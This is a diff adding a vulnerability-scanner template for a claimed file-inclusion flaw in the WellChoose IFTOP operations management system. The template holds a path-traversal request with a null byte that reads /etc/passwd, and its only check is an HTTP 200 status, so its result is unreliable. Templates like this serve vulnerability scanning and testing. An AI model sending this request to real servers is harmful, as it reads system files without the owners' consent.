@@ -1,0 +1,23 @@
+id: poc-cewoprvcbpo7dtuo
+info:
+  name: WellChoose IFTOP企业运维管理系统index page 存在文件包含漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cewoprvcbpo7dtuo'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cewoprvcbpo7dtuo
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /index.php?page=../../etc/passwd%00 HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
